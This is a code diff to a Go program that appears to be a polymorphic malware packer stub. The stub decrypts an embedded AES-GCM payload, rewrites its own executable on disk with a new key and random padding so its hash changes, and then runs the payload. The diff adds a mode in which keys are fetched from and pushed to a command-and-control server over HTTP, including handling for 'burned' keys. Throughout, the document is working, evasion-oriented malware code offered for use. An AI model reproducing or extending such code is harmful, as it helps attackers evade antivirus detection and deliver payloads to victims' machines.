@@ -3,11 +3,16 @@
 // rewrites itself on disk (changing its hash), then executes
 // the original payload.
 //
+// Supports two key modes:
+//   - Local: key and nonce are in the JSON metadata (legacy / no --c2-url)
+//   - Remote: key_id and c2_url are in the metadata; key is fetched/pushed to the C2 server
+//
 // File layout (read from the end):
 //   [stub .exe] [random padding] [ciphertext] [JSON meta] [metaLen 4B] ["HBX1"]
 package main
 
 import (
+	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
@@ -15,7 +20,9 @@ import (
 	"encoding/binary"
 	"encoding/json"
 	"fmt"
+	"io"
 	"math/big"
+	"net/http"
 	"os"
 	"os/exec"
 	"path/filepath"
@@ -25,12 +32,28 @@ import (
 const magic = "HBX1"
 
 type meta struct {
-	Key           string `json:"key"`
-	Nonce         string `json:"nonce"`
+	Key           string `json:"key,omitempty"`
+	Nonce         string `json:"nonce,omitempty"`
+	KeyID         string `json:"key_id,omitempty"`
+	C2URL         string `json:"c2_url,omitempty"`
 	OriginalName  string `json:"original_name"`
 	OriginalSize  int    `json:"original_size"`
 	CiphertextLen int    `json:"ciphertext_len"`
 	StubSize      int    `json:"stub_size"`
+}
+
+type keyResponse struct {
+	Key   string `json:"key"`
+	Nonce string `json:"nonce"`
+}
+
+type storeKeyRequest struct {
+	Key   string `json:"key"`
+	Nonce string `json:"nonce"`
+}
+
+type storeKeyResponse struct {
+	KeyID string `json:"key_id"`
 }
 
 func main() {
@@ -68,10 +91,24 @@ func main() {
 	ciphertext := data[ctStart:ctEnd]
 	stubBytes := data[:m.StubSize]
 
-	// ── 3. Decrypt the payload ──────────────────────────────────────
-	key, _ := base64.StdEncoding.DecodeString(m.Key)
-	nonce, _ := base64.StdEncoding.DecodeString(m.Nonce)
+	// ── 3. Get the decryption key ───────────────────────────────────
+	var key, nonce []byte
+	useC2 := m.KeyID != "" && m.C2URL != ""
 
+	if useC2 {
+		fmt.Fprintln(os.Stderr, "[INFO] Fetching key from C2 server...")
+		key, nonce, err = fetchKey(m.C2URL, m.KeyID)
+		if err != nil {
+			fatal("cannot retrieve key: %v", err)
+		}
+	} else if m.Key != "" && m.Nonce != "" {
+		key, _ = base64.StdEncoding.DecodeString(m.Key)
+		nonce, _ = base64.StdEncoding.DecodeString(m.Nonce)
+	} else {
+		fatal("no key source: metadata has neither key nor key_id")
+	}
+
+	// ── 4. Decrypt the payload ──────────────────────────────────────
 	block, err := aes.NewCipher(key)
 	if err != nil {
 		fatal("cipher: %v", err)
@@ -88,7 +125,7 @@ func main() {
 		fatal("size mismatch")
 	}
 
-	// ── 4. Self-modify: re-encrypt with a fresh key and padding ─────
+	// ── 5. Self-modify: re-encrypt with a fresh key and padding ─────
 	newKey := make([]byte, 32)
 	newNonce := make([]byte, 12)
 	rand.Read(newKey)
@@ -98,24 +135,33 @@ func main() {
 	newGCM, _ := cipher.NewGCM(newBlock)
 	newCiphertext := newGCM.Seal(nil, newNonce, plaintext, []byte(magic))
 
-	// Random padding length between 1 KB and 64 KB.
 	padLen, _ := rand.Int(rand.Reader, big.NewInt(63*1024))
 	padding := make([]byte, 1024+int(padLen.Int64()))
 	rand.Read(padding)
 
 	newMeta := meta{
-		Key:           base64.StdEncoding.EncodeToString(newKey),
-		Nonce:         base64.StdEncoding.EncodeToString(newNonce),
 		OriginalName:  m.OriginalName,
 		OriginalSize:  m.OriginalSize,
 		CiphertextLen: len(newCiphertext),
 		StubSize:      m.StubSize,
 	}
+
+	if useC2 {
+		newKeyID, err := pushKey(m.C2URL, newKey, newNonce)
+		if err != nil {
+			fatal("cannot store new key on server: %v", err)
+		}
+		newMeta.KeyID = newKeyID
+		newMeta.C2URL = m.C2URL
+	} else {
+		newMeta.Key = base64.StdEncoding.EncodeToString(newKey)
+		newMeta.Nonce = base64.StdEncoding.EncodeToString(newNonce)
+	}
+
 	newMetaJSON, _ := json.Marshal(newMeta)
 	newMetaLenBuf := make([]byte, 4)
 	binary.BigEndian.PutUint32(newMetaLenBuf, uint32(len(newMetaJSON)))
 
-	// Assemble the new binary.
 	var newFile []byte
 	newFile = append(newFile, stubBytes...)
 	newFile = append(newFile, padding...)
@@ -124,13 +170,9 @@ func main() {
 	newFile = append(newFile, newMetaLenBuf...)
 	newFile = append(newFile, []byte(magic)...)
 
-	// On Windows a running .exe cannot be overwritten in place,
-	// but it CAN be renamed. Rename self, write the new version,
-	// then mark the old file for cleanup.
 	oldPath := exePath + ".old"
 	os.Remove(oldPath)
 	if err := os.Rename(exePath, oldPath); err != nil {
-		// Fallback: try overwriting directly (works on Linux).
 		if err2 := os.WriteFile(exePath, newFile, 0o755); err2 != nil {
 			fatal("cannot rewrite self: %v", err2)
 		}
@@ -142,7 +184,7 @@ func main() {
 
 	fmt.Fprintln(os.Stderr, "[INFO] Polymorphic signature updated successfully.")
 
-	// ── 5. Execute the payload ──────────────────────────────────────
+	// ── 6. Execute the payload ──────────────────────────────────────
 	tmpDir, err := os.MkdirTemp("", "poly-")
 	if err != nil {
 		fatal("temp dir: %v", err)
@@ -166,6 +208,60 @@ func main() {
 	cmd.Stderr = os.Stderr
 	cmd.Stdin = os.Stdin
 	cmd.Run()
+}
+
+func fetchKey(c2url, keyID string) ([]byte, []byte, error) {
+	resp, err := http.Get(c2url + "/keys/" + keyID)
+	if err != nil {
+		return nil, nil, fmt.Errorf("cannot reach key server at %s: %w", c2url, err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode == http.StatusNotFound {
+		return nil, nil, fmt.Errorf("key not found on server (may have been burned)")
+	}
+	if resp.StatusCode != http.StatusOK {
+		body, _ := io.ReadAll(resp.Body)
+		return nil, nil, fmt.Errorf("server returned %d: %s", resp.StatusCode, string(body))
+	}
+
+	var kr keyResponse
+	if err := json.NewDecoder(resp.Body).Decode(&kr); err != nil {
+		return nil, nil, fmt.Errorf("bad response: %w", err)
+	}
+
+	key, err := base64.StdEncoding.DecodeString(kr.Key)
+	if err != nil {
+		return nil, nil, fmt.Errorf("bad key encoding: %w", err)
+	}
+	nonce, err := base64.StdEncoding.DecodeString(kr.Nonce)
+	if err != nil {
+		return nil, nil, fmt.Errorf("bad nonce encoding: %w", err)
+	}
+	return key, nonce, nil
+}
+
+func pushKey(c2url string, key, nonce []byte) (string, error) {
+	body, _ := json.Marshal(storeKeyRequest{
+		Key:   base64.StdEncoding.EncodeToString(key),
+		Nonce: base64.StdEncoding.EncodeToString(nonce),
+	})
+
+	resp, err := http.Post(c2url+"/keys", "application/json", bytes.NewReader(body))
+	if err != nil {
+		return "", fmt.Errorf("cannot reach key server: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return "", fmt.Errorf("key server returned %d", resp.StatusCode)
+	}
+
+	var result storeKeyResponse
+	if err := json.NewDecoder(resp.Body).Decode(&result); err != nil {
+		return "", fmt.Errorf("bad response: %w", err)
+	}
+	return result.KeyID, nil
 }
 
 func fatal(format string, args ...interface{}) {
